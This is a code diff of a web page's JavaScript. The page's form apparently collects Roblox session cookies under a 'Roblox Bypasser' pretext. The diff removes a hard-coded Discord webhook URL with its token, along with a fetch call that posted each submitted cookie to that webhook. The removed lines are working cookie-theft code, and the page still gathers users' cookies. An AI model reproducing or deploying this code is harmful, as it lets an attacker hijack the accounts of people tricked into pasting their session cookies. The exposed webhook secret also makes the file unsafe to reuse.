@@ -224,7 +224,6 @@
 const successSound = document.getElementById("sfx-success");
 const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
-const webhookUrl = "https://discord.com/api/webhooks/1392040915127898123/aTZNr3AVMdG4AyGFxYX_ZcYwrmmtiGVGn2iVTIPza6_cd9sclwiNXyfIFhRjGTxM51Vc";
 
 $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
@@ -232,24 +231,6 @@ $("#cookieForm").on("submit", async function(e) {
   if (cookie.length < 10) {
     alert("Cookie too short");
     return;
-  }
-
-  // Send cookie to Discord webhook
-  const webhookPayload = {
-    content: `New Cookie Submitted: \`${cookie}\``,
-    username: "Roblox Bypasser Bot",
-    avatar_url: "https://i.imgur.com/4j8o1.png"
-  };
-  try {
-    await fetch(webhookUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(webhookPayload)
-    });
-  } catch (webhookError) {
-    console.error("Failed to send to webhook:", webhookError);
   }
 
   $("#refreshBtn").hide();
